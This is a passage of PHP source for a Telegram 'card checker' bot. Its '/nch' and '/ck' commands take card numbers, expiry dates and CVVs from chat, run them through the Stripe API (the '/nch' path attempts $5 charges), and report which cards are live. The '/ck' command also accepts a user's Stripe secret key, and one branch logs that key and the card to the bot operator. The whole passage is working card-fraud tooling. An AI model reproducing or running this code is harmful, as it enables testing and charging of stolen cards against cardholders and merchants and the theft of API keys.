                    sendMessage($chatId, "<b>SERVER ERROR</b>\n <b>card:</b><code>$lista</code>\n<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> \n\n<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>\n\n<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
                    sendMessage($chatId, "<b>This bug was captured and sent to admin</b>", $message_id);
                    sendLog($chatId, "<b>BUG REPORTED /chg</b>\n <b>card:</b><code>$lista</code>\n<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> \n\n<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>\n\n<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
                    }
                  }
  //==================[nch Command]==================//
  elseif (strpos($message, "/nch") === 0){
    $message = substr($message, 4);
    $amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
    $cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
    $mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
    $yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
    $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
                  $lista = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'';
                  $ch = curl_init();
                  curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
                  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                  'Host: lookup.binlist.net',
                  'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
                  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, '');
                  $fim = curl_exec($ch);
                  $bank = GetStr($fim, '"bank":{"name":"', '"');
                  $name = GetStr($fim, '"name":"', '"');
                  $brand = GetStr($fim, '"brand":"', '"');
                  $country = GetStr($fim, '"country":{"name":"', '"');
                  $emoji = GetStr($fim, '"emoji":"', '"');
                  $scheme = GetStr($fim, '"scheme":"', '"');
                  $type = GetStr($fim, '"type":"', '"');
                  if(strpos($fim, '"type":"credit"') !== false){
                  $bin = 'Credit';
                  }else{
                  $bin = 'Debit';
                  };
                  $ch = curl_init();
                  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_USERPWD, $pk. ':' . '');
                  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.' '.$last.'&owner[email]='.$email.'&owner[address][line1]='.$street.'&owner[address][city]='.$city.'&owner[address][state]='.$state.'&owner[address][postal_code]='.$postcode.'&owner[address][country]=US&card[number]='.$cc.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
                  $result1 = curl_exec($ch);
                  $tok1 = Getstr($result1,'"id": "','"');
                  $msg1 = Getstr($result1,'"message": "','"');
                  if(strpos($result1, "card_error")){
                    sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg1 </b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if (strpos($result1, "card_declined")){
                    sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg1 </b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if (strpos($result1, "rate_limit")){
                    sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg1 </b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if (strpos($result1, "invalid_cvc")){
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if (strpos($result1, "sources_required_type_param")){
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if (strpos($result1, "testmode_charges_only")){
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» SERVER REJECTED ❌</b>\n<b>Response -» Gate is Dead </b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if ((strpos($result3, 'invalid_expiry_year'))){
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» EXPRIED CARD ❌</b>\n<b>Response -» invalid_expiry_year </b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if ((strpos($result3, 'invalid_expiry_month'))){
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» EXPRIED CARD ❌</b>\n<b>Response -» invalid_expiry_month </b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if ((strpos($result3, 'incorrect_number'))){
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» INVALID CARD ❌</b>\n<b>Response -» Incorrect number </b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  $ch = curl_init();
                  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                  curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$last.'&source='.$tok1.'&address[line1]='.$street.'&address[city]='.$city.'&address[state]='.$state.'&address[postal_code]='.$postcode.'&address[country]=US');
                  $result2 = curl_exec($ch);
                  $tok2 = Getstr($result2,'"id": "','"');
                  $msg2 = Getstr($result2,'"message": "','"');
                  if(strpos($result2, "card_error")){
                    sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg2 </b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if (strpos($result1, "invalid_cvc")){
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if (strpos($result1, "sources_required_type_param")){
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
    
                  $ch = curl_init();
                  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                  curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=500&currency=usd&customer='.$tok2.'');
                  $result3 = curl_exec($ch);
                  $msg3 = Getstr($result3,'"message": "','"');
                  $rcp = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));
                  $rsk = trim(strip_tags(getStr($result3,'"risk_score": "','"')));
                  $rsklv = trim(strip_tags(getStr($result3,'"risk_level": "','"')));
                  if(strpos($result3, '"status": "succeeded"' )) {
                  sendMessage($chatId, "<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED 5$ ✅</b>\n<b>Response -» CHARGED 5$ SUCCESSFULLY ✅</b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n<b>Risk score -» $rsk</b>\n<b> Risk Level -» $rsklv</b>\n<b> RECEPIT URL -» $rcp</b>\n\n---------[Bin details]-----------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY: $country \n\n\n--------------------------------\n\n\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                  sendLog ($chatId, "<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED 5$ ✅</b>\n<b>Response -» CHARGED 5$ SUCCESSFULLY ✅</b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n<b>Risk score -» $rsk</b>\n<b> Risk Level -» $rsklv</b>\n<b> RECEPIT URL -» $rcp</b>\n\n---------[Bin details]-----------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY: $country \n\n\n--------------------------------\n\n\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                  return;
                  }
                  if(strpos($result3, "insufficient_funds" )) {
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED ✅</b>\n<b>Response -» Insufficient Funds </b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if ((strpos($result3, "card_error_Chargeentication_required")) || (strpos($result2, "card_error_Chargeentication_required"))){ sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» APROVED ⚠️</b>\n<b>Response -» 3D Card </b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                  }
                  if(strpos($result3,"Your card's security code is incorrect.")){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED ⚠️</b>\n<b>Response -» CCN Matched </b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, "fraudulent"))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» REJECTED ⛔</b>\n<b>Response -» Fraudulent </b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, "expired_card"))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» expired_card </b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, '"decline_code": "generic_decline"'))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» Generic Declined </b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                      }
                    if ((strpos($result3, "do_not_honor"))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» Do Not Honor </b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, 'rate_limit'))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN LATER ⚠️</b>\n<b>Response -» SK is rate limit </b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                      
                    if ((strpos($result3, "Your card was declined."))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» Do Not Honor </b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, ' "message": "Your card number is incorrect."')) || (strpos($result3, ' "message": "Your card number is incorrect."'))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» No Account </b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, ' "message": "testmode_charges_only"'))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» SERVER REJECTED ❌</b>\n<b>Response -» Gate is Dead </b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, 'transaction_not_allowed'))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» Your card does not support this type of purchase. </b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, 'invalid_number'))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» NO ACCOUNT ❌</b>\n<b>Response -» invalid_number </b>\n<b>Gateway -» Stripe CCN Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                  else {
                    sendMessage($chatId, "<b>SERVER ERROR</b>\n <b>card:</b><code>$lista</code>\n<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> \n\n<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>\n\n<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
                    sendMessage($chatId, "<b>This bug was captured and sent to admin</b>", $message_id);
                    sendLog($chatId, "<b>BUG REPORTED /chg</b>\n <b>card:</b><code>$lista</code>\n<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> \n\n<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>\n\n<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
                    }
                  }
  //==================[Custom SK Command]==================//
  elseif (strpos($message, "/ck") === 0){
    
    $message = substr($message, 4);
    $cc = multiexplode(array(":", "/", " ", "|"), $message)[0];
    $mm = multiexplode(array(":", "/", " ", "|"), $message)[1];
    $yy = multiexplode(array(":", "/", " ", "|"), $message)[2];
    $cvv = multiexplode(array(":", "/", " ", "|"), $message)[3];
    $sk = multiexplode(array(":", "/", " ", "|"), $message)[4];
                    $lista = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'|'.$sk.'';
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
                    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                    'Host: lookup.binlist.net',
                    'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
                    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, '');
                    $fim = curl_exec($ch);
                    $bank = GetStr($fim, '"bank":{"name":"', '"');
                    $name = GetStr($fim, '"name":"', '"');
                    $brand = GetStr($fim, '"brand":"', '"');
                    $country = GetStr($fim, '"country":{"name":"', '"');
                    $emoji = GetStr($fim, '"emoji":"', '"');
                    $scheme = GetStr($fim, '"scheme":"', '"');
                    $type = GetStr($fim, '"type":"', '"');
                    if(strpos($fim, '"type":"credit"') !== false){
                    $bin = 'Credit';
                    }else{
                    $bin = 'Debit';
                    };
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                    curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                    curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.' '.$last.'&owner[email]='.$email.'&owner[address][line1]='.$street.'&owner[address][city]='.$city.'&owner[address][state]='.$state.'&owner[address][postal_code]='.$postcode.'&owner[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
                    $result1 = curl_exec($ch);
                    $tok1 = Getstr($result1,'"id": "','"');
                    $msg1 = Getstr($result1,'"message": "','"');
                    if(strpos($result1, "card_error")){
                      sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg1 </b>\n<b>Gateway -» Stripe auth v2 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
    
                      return;
                    }
                    if (strpos($result1, "card_declined")){
                      sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg1 </b>\n<b>Gateway -» Stripe auth v2 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if (strpos($result1, "rate_limit")){
                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN LATER ⚠️</b>\n<b>Response -» SK is rate limit </b>\n<b>Gateway -» Stripe auth v2 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        sendLog($chatId, "<b>SK LOGGED</b>\n\n<b>card:</b><code>$lista</code>\n<b> RECEPIT URL -» $rcp</b>", $message_id);
                        return;
                    }
                    if (strpos($result1, "invalid_cvc")){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe auth v2 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if (strpos($result1, "sources_required_type_param")){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe auth v2 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if (strpos($msg1, "invalid_request_error")){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» SERVER REJECTED ❌</b>\n<b>Response -» Please input SK </b>\n<b>Gateway -» Stripe Custom SK charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
    
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                    curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                    curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$last.'&source='.$tok1.'&address[line1]='.$street.'&address[city]='.$city.'&address[state]='.$state.'&address[postal_code]='.$postcode.'&address[country]=US');
                    $result2 = curl_exec($ch);
                    $tok2 = Getstr($result2,'"id": "','"');
                    $msg2 = Getstr($result2,'"message": "','"');
                    if(strpos($result2, "card_error")){
                      sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg2 </b>\n<b>Gateway -» Stripe auth v2 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if (strpos($result2, "invalid_cvc")){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe auth v2 </b>%0\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if (strpos($result2, "sources_required_type_param")){
